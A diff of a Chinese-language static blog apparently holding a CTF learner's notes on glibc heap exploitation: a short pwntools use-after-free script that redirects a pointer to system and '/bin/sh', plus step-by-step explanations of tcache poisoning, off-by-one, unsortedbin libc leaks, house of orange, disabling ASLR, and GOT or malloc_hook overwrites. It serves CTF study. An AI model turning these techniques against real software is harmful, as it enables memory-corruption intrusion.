@@ -342,6 +342,11 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line"><span class="meta">#io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,28382)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x400D6E&#x27;</span>)ls</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_1(size,content):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;size: \n&#x27;</span>,str(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">def delete_2(index):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;index: \n&#x27;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def print_3(index):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;Your choice: &#x27;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27;index: \n&#x27;</span>,str(index))    </span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x602010</span></span><br><span class="line">system=<span class="number">0x4007A0</span></span><br><span class="line"></span><br><span class="line">create_1(<span class="number">0x19</span>,b<span class="number">&#x27;</span>AAA<span class="number">&#x27;</span>)</span><br><span class="line">create_1(<span class="number">0x19</span>,b<span class="number">&#x27;B</span>BB<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete_2(<span class="number">0</span>)</span><br><span class="line">delete_2(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create_1(<span class="number">0x10</span>,p64(binsh)+p64(system))</span><br><span class="line"></span><br><span class="line">print_3(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>这道题就是一个最基础的uaf漏洞的题，写的比较详细，往对以后的这种漏洞有所启迪。</p>
+<p>在libc版本为2.27的题目中，这种uaf漏洞，能使用tcachebins这样一种结构</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606150233631.png" alt="image-20240606150233631"></p>
+<p>这种结构出现在大小小于0x400的chunk在被free后链接而成（大于0x400的在free后会成为unsortedbin），在这种结构中，chunk的fd指针由于指向下一个chunk的原本的的数据段，现在的fd段（如果下面没有chunk了，这个fd指针将会指向0）。这里面的chunk在再次使用时遵循的是先进先出的规律，当再次malloc时，先吧上面一个满足大小的chunk拿出来使用，然后在将下面一个满足大小的chunk拿出来使用。</p>
+<p>这里如果我们便可以通过uaf漏洞，将chunk中fd指针的值修改为我们需要的地址空间然后，malloc到这块空间，便可以对其进行修改。</p>
+<p>（这里好像不用在意要修改的地址空间上两位的值能不能构成chunk的prev size和size都可以，malloc到那里直接修改，但是在其他版本可能要满足条件）</p>
 <p><strong>unlink</strong></p>
 <p>现简单说一下这一类题的大致问题在哪里，与一般的解决办法。</p>
 <p>要能使用这种解决办法的题，会以下的几种重要的东西是我们能够使用的，才能使用这种办法。</p>
@@ -355,6 +360,61 @@
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602084358411.png" alt="image-20240602084358411"></p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085046748.png" alt="image-20240602085046748"></p>
 <p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240602085110947.png" alt="image-20240602085110947"></p>
+<p><strong>Off-By-One</strong></p>
+<p>这个漏洞在很多的地方都算是比较常见的吧，不过在之前的栈的时候属于不太好利用的一种，不过在堆中由于堆的特殊性导致，这个漏洞难够在很多地方发挥出意想不到的作用。</p>
+<p>这个漏洞的具体就是使用read等函数向某块地址写入数据时，如果使用了循环的方式，而循环的次数的大小与那块地址的大小相同，如我们有的是大小为16的数组，我们通过循环向这里写入数字，而我们的循环的次数是由我们数组的大小决定，这里简单的说就是对循环的次数没有进行严格的检查，像循环的次数由变量x决定，并且循环的此时就等于这个x的值，这里x&#x3D;16，看起来好像没什么问题但是会发现，由于程序中的这些数组的起始都是从0开始，包括循环的+</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240604222351621.png" alt="image-20240604222351621"></p>
+<p><strong>unsortedbin泄露libc地址</strong></p>
+<p>关于这种bin的具体结构等之后学会了在细讲，这里先讨论如何利用这种bin将libc的地址泄露。</p>
+<p>由于在不同的libc版本中unsortedbin的产生不同，这里将针对不同libc版本进行分别讲解。</p>
+<p><em>一，libc-2.27</em></p>
+<p>在2.27的libc版本中又一种tcachebins的存在，这会导致数据区小于0x400，整体小于0x410的chunk在free后被放入tcachebins这里面，供下次使用，因此我们这里首先要先malloc一块大小大于0x400的chunk，同时这个chunk还不能与top chunk相邻，否则在free后会被top chunk直接合并，因此我们必须保证这个大于0x400的chunk与top chunk中间还有一个chunk用于隔离这两个chunk。就像满足这样的条件</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153035259.png" alt="image-20240606153035259"></p>
+<p>然后我们将大于0x400的这块chunk，free掉，就会得到一块被放置在unsortedbin中，且满足条件的free</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153330482.png" alt="image-20240606153330482"></p>
+<p>而此时这个free掉的chunk中的fd和bk指针由于只有这一个chunk在unsortedbin中，所以他们同时指向的都是main_arena+96的地址</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240606153458981.png" alt="image-20240606153458981"></p>
+<p>并且这个地址在程序中与libc的基地址的距离是始终保持相同的，只要能泄露这个便可以知道程序中的libc的基地址，在其他版本中其实也如此，不过在有的地方也有不同。</p>
+<p><strong>house of orange</strong></p>
+<p>今天做题的时候刚好遇到这个知识点，那就现在把他写一下。</p>
+<p>这个的作用并不能直接作用于程序上实现shell，这个漏洞的作用只是在于特殊情况下泄露libc的地址，其实这里用到也就是创造unsortedbin，从而泄露libc的地址，我们知道在上面的使用unsortedbin泄露libc地址的方法前提是要能创造一个大小满足free后进入unsortedbin的大小的chunk并且这个chunk还不能与top chunk相邻的的条件的chunk，并且还要能将这个chunk，free掉使得它进入到unsortedbin中，然后在将fd指针的值打印出来，这样才能泄露libc的值，而这里我们就是在面对没有free函数的情况下，依然能产生unsortedbin从而泄露libc的值。</p>
+<p>具体的不细将，直接将做法。</p>
+<p>关于这种做法目前我之在libc-2.23上做过，关于其他的libc可能有所不同，请注意。这里也是按在libc-2.23上来讲。</p>
+<p><em>一，第一步堆溢出，修改top chunk的size值</em></p>
+<p>这里必须有一个靠近top chunk的chunk能被我们写入数据进去，同时这个chunk要能进行溢出，溢出的大小要能刚好修改到top chunk的size段。</p>
+<p>关于修改的这个top chunk的size的大小并不是随意的，也是有要求的，</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607144743668.png" alt="image-20240607144743668"></p>
+<p>这是未修改的top chunk的大小，size段的大小为0x20fe0，这里我们要修改成0xfe1，如下图，从而使程序能将top chunk的大小识别为0xfe0（那一个字节用于放数据，不计入总大小）</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607145205512.png" alt="image-20240607145205512"></p>
+<p>关于为什么要修改top  chunk的大小为这个数据，我解释不好，有兴致的可以参考一下这篇文章<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/?h=of+orange">House of Orange - CTF Wiki (ctf-wiki.org)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的size必须要对齐到内存页</span><br></pre></td></tr></table></figure>
+
+<p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0&#x3D;0x623000 是对于 0x1000（4kb）对齐的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。</p>
+<p>以上便是引用那里面的话，这里关于修改的大小我目前使用0x0fe1是成功的，使用了0x1fe1不能成功，原因未知。有时间研究一下。</p>
+<p><em>二，申请一个大小大于这个top chunk的堆块</em></p>
+<p>这里我申请的大小为0xff0，这是申请后的样子</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607150811073.png" alt="image-20240607150811073"></p>
+<p>就是这样我们便能够在没有使用free函数的情况下也能产生一个unsortedbin,并且其中fd和bk指针都指向main_arena+88的地址空间。</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607151041083.png" alt="image-20240607151041083"></p>
+<p>现在虽然产生了unsortedbin但是我们会发现，此时我们如果只有一个用于存放最近的指针的空间，会发现这个指针指向的chunk时是下面的的那个chunk，所以这个没有用。</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607151506598.png" alt="image-20240607151506598"></p>
+<p><em>三，再申请一个chunk</em></p>
+<p>这个新申请的chunk的大小，没什么限制，别太大太小就行，这里我申请的大小为0x40</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607152043072.png" alt="image-20240607152043072"></p>
+<p>申请之后会发现存放指针的地址空间，存放的新的chunk指针为unsortedbin上面的新chunk，并且这个新chunk的内容也大有搞头，这里按理论来说这个新chunk的数据段前两个字节存放的都是<strong>0x00007614787c4188</strong>这个数据，（这里因为这道题在申请chunk时，必须要输入数据，所以这里的数据段第一个字节，不能使用，只能使用第二个字节的数据），这个地址指向的为main_arena+1640，这个地址与libc基地址的距离是固定的。</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/image-20240607152729734.png" alt="image-20240607152729734"></p>
+<p>同时这个chunk的第3，第4字节存放的数据时这个chunk的头地址。</p>
+<p>就这样只要我们能将这个新chunk的内容打印出来，接收第2字节的main_arena+1640的地址，第3字节的chunk的头地址，那就可以跟具这个地址与libc基地址的差得到基地址的大小（这个差值是固定不变的），还有chunk的地址也能拿到</p>
+<ul>
+<li>修改top chunk的size大小为0xfe1</li>
+<li>申请一个大小大于0xfe0的chunk</li>
+<li>在申请一个0x20的chunk</li>
+<li>打印并接收新chunk的内容（注意如果一定要输入数据，注意不要过多，影响第二字节的内容）</li>
+<li>减去相应的差值得到libc基地址。</li>
+</ul>
 
       
     </div>
@@ -1293,7 +1353,7 @@
 <p><strong>top chunk</strong></p>
 <ul>
 <li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。</li>
-<li><strong>作用：</strong>该chunk并<strong>不属于任何****bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。</li>
+<li><strong>作用：</strong>该chunk并*<em>不属于任何</em>**<em>bin</em>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。</li>
 <li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</li>
 </ul>
 <p>一般来说当我们在程序中malloc一个堆块后，程序分配给我们的chunk其上方就是top chunk的区域，其中包含的就是空闲状态的chunk，方便下次需要chunk时能快速调用。这两个chunk在程序中分配图如下：</p>
@@ -2655,6 +2715,45 @@
 
 
 <p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/image-20240325200803566-17115472740935.png" alt="image-20240325200803566"></p>
+<p>对于很多题目其在远程的的环境与本地的环境是不同的，对于这种环境不同的题目可以将其在远程所给的libc文件其与这道题目相结合，使其在本机上的环境与在远程的环境保持一致，通过一下命令进行，如果在存放libc的文件夹中找不到我们所需要的libc可以将其转到其中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter /home/giantbranch/Desktop/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0b</span>untu9<span class="number">.9</span>_amd64/ld<span class="number">-2.31</span>.so --<span class="built_in">set</span>-rpath /home/giantbranch/Desktop/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>_amd64 <span class="title function_">login</span><span class="params">(文件名)</span></span><br><span class="line">    patchelf --<span class="built_in">set</span>-interpreter libc文件名（包括路径） --<span class="built_in">set</span>-rpath libc文件所在的文件夹全名（包括路径） pwn（文件名） </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter  /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64/libc-<span class="number">2.23</span>.so（根据题目要求的libc版本来） --<span class="built_in">set</span>-rpath /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64（文件夹名固定） pwn</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>在命令中，<code>2&gt;&amp;1</code> 是用来重定向标准错误（stderr）到标准输出（stdout）的。</p>
+<ul>
+<li><code>2</code> 代表标准错误（stderr）。</li>
+<li><code>1</code> 代表标准输出（stdout）。</li>
+<li><code>&gt;</code> 是重定向操作符。</li>
+<li><code>&amp;</code> 表示我们是在重定向一个文件描述符（在这种情况下是标准错误），而不是创建一个名为<code>&amp;1</code>的文件。</li>
+</ul>
+<p>因此，<code>2&gt;&amp;1</code> 说的是：“将标准错误（文件描述符2）重定向到与标准输出（文件描述符1）相同的地方。”</p>
+<p><code>1&gt;&amp;2</code> 说的是：“将标准输出（文件描述符1）重定向到与标准错误（文件描述符2）相同的地方 </p>
+<p><strong>在遇到堆的题目时必须注意其所在的libc版本，不同的libc版本有的保护机制不同</strong></p>
+<p><strong>ASLR</strong>（Address Space Layout Randomization，地址空间布局随机化）是一种计算机安全技术，旨在增加攻击者成功利用漏洞的难度。它通过在每次程序启动时随机化内存布局，特别是代码和数据的加载地址，来减少攻击者对程序内存结构的了解。</p>
+<p>具体来说，ASLR会随机化程序的基址、堆栈、共享库、内核数据结构等的位置，使得攻击者不能依赖于已知的内存布局来进行攻击。这样一来，即使攻击者成功地发现了漏洞并尝试利用，他们也需要在不确定的内存位置上执行恶意代码，从而增加了攻击的复杂性</p>
+<p>一般情况下这个ASLR都是开启的，如果我们在有的题需要对程序的这个保护关闭的话可以使用一下的办法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">[sudo] password : 你自己的密码</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>重启虚拟机后就会自动开启，所以不用担心。</p>
+<p><strong>RELRO保护</strong>是一种防御性措施，用于防止某些攻击，例如PLT&#x2F;GOT覆盖和类似的漏洞。启用了Full RELRO的程序在运行时会锁定重定位表和全局偏移表（GOT），使它们只读，这可以防止攻击者修改这些表来劫持程序控制流或执行恶意代码</p>
+<p>在题目中，特别是堆题中这个RELRO保护的开启与否对题目的做法有重要的关系，在题目一般会有两种情况的，保护开启</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Full RELRO</span><br></pre></td></tr></table></figure>
+
+<p>保护关闭</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO</span><br></pre></td></tr></table></figure>
+
+<p>当我们做题时遇到保护关闭的情况时，可以使用直接修改函数got表上的地址，使其地址中存放的是另一个函数的got地址（如直接修改为system函数的got表，使得程序在执行原本的函数时，直接被改为执行sytem函数）</p>
+<p>如果遇到程序中的保护开启时，这种办法便不能行，此时由于这个保护的存在导致got表上的地址是被保护起来的，不可被修改，此时要拿到shell便可以考虑修改malloc_hook和free_hook的地址使其直接执行one_getgad的地址拿到shell。</p>
+<ul>
+<li><input disabled type="checkbox"> malloc_hook</li>
+<li><input disabled type="checkbox"> free_hook</li>
+<li><input disabled type="checkbox"> unsorted bin 泄露libc地址</li>
+</ul>
 
       
     </div>
@@ -2850,7 +2949,7 @@
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 <p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
-<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
+<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#109;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>
 
       
     </div>
